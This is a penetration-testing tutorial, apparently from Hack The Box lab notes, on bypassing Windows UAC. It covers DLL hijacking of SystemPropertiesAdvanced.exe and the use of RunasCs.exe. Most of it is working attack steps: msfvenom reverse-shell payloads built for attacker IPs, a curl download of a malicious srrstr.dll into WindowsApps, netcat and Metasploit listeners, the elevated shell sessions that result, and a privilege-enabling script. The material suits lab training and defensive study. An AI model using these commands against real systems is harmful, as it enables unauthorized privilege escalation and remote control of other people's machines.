The [UACMe](https://github.com/hfiref0x/UACME) repo features a comprehensive list of UAC bypasses, which can be used from the command line. project maintains a list of UAC bypasses, including information on the affected Windows build number, the technique used, and if Microsoft has issued a security update to fix it. 

## Manual DLL Bypass

Let's use technique number 54, which is stated to work from Windows 10 build 14393. This technique targets the 32-bit version of the auto-elevating binary `SystemPropertiesAdvanced.exe`. There are many trusted binaries that Windows will allow to auto-elevate without the need for a UAC consent prompt.

According to [this](https://egre55.github.io/system-properties-uac-bypass) blog post, the 32-bit version of `SystemPropertiesAdvanced.exe` attempts to load the non-existent DLL srrstr.dll, which is used by System Restore functionality.

When attempting to locate a DLL, Windows will use the following search order.

1. The directory from which the application loaded.
2. The system directory `C:\Windows\System32` for 64-bit systems.
3. The 16-bit system directory `C:\Windows\System` (not supported on 64-bit systems)
4. The Windows directory.
5. Any directories that are listed in the PATH environment variable.

#### Reviewing Path Variable

Let's examine the path variable using the command `cmd /c echo %PATH%`. This reveals the default folders below. The `WindowsApps` folder is within the user's profile and writable by the user.

```powershell-session
PS C:\htb> cmd /c echo %PATH%

C:\Windows\system32;
C:\Windows;
C:\Windows\System32\Wbem;
C:\Windows\System32\WindowsPowerShell\v1.0\;
C:\Users\sarah\AppData\Local\Microsoft\WindowsApps;
```

We can potentially bypass UAC in this by using DLL hijacking by placing a malicious `srrstr.dll` DLL to `WindowsApps` folder, which will be loaded in an elevated context.

#### Generating Malicious srrstr.dll DLL

First, let's generate a DLL to execute a reverse shell.

```shell-session
slomkm@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of dll file: 5120 bytes
```

> [!NOTE]
> In the example above, we specified our tun0 VPN IP address.

#### Starting Python HTTP Server on Attack Host

Copy the generated DLL to a folder and set up a Python mini webserver to host it.

```shell-session
slomkm@htb[/htb]$ sudo python3 -m http.server 8080
```

#### Downloading DLL Target

Download the malicious DLL to the target system, and stand up a `Netcat` listener on our attack machine.

```powershell-session
PS C:\htb>curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

#### Starting nc Listener on Attack Host

```shell-session
slomkm@htb[/htb]$ nc -lvnp 8443
```

#### Executing SystemPropertiesAdvanced.exe on Target Host

Now, we can try the 32-bit version of `SystemPropertiesAdvanced.exe` from the target host.

```cmd
C:\htb> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

#### Receiving Connection Back

Checking back on our listener, we should receive a connection almost instantly.

```shell-session
slomkm@htb[/htb]$ nc -lvnp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 50273
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami

whoami
winlpe-ws03\sarah


C:\Windows\system32>whoami /priv

whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
```

This is successful, and we receive an elevated shell that shows our privileges are available and can be enabled if needed.

---

## RunasCs.exe Bypass
### Check privileges

When you have shell, you may run `whoami /priv` put this shell is in lower intigrety level, So you may have good privileges but you can't see them.

```powershell
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                              State
============================= ======================================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled
```

### UAC bypass

So you need to bypass the UAC to get highter intigrety level shell. You can use  [UACME](https://github.com/hfiref0x/UACME) or `RunasCs.exe`
we have used `-r` for reverse shell, you can make your own reverse shell or execute what ever you want. And `-b` to bypass UAC.

```batch
PS C:\ProgramData> .\RunasCs.exe <username> <password> cmd -r <My-ip>:<PORT> --bypass-uac --logon-type '8'
```

### Enable privileges

After that you need to enable your privileges.
Using powershell directly may make you suffer. So try to use `msfvenom`, `metasploit`


```sh
oxdf@hacky$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.6 LPORT=9001 -f exe -o rev.exe
oxdf@hacky$ msfconsole
...[snip]...
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/handler) > set LPORT 9001
LPORT => 9001
msf6 exploit(multi/handler) > run
```

At Target:

```powershell
PS 1.st_reverse_shell> .\rev.exe
```

At Metasploit:

```sh
msf6 exploit(multi/handler) >

[*] Started reverse TCP handler on 10.10.14.6:9001
[*] Sending stage (201798 bytes) to 10.10.11.251
[*] Meterpreter session 1 opened (10.10.14.6:9001 -> 10.10.11.251:49690) at 2024-06-03 17:05:50 -0400

meterpreter > getuid
Server username: POV\alaading
```

You may find your self Enabled privileges and if not use `Enable-Privilege.ps1` to enable your priv

```powershell
PS C:\htb> Import-Module .\Enable-Privilege.ps1
PS C:\htb> .\EnableAllTokenPrivs.ps1
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```
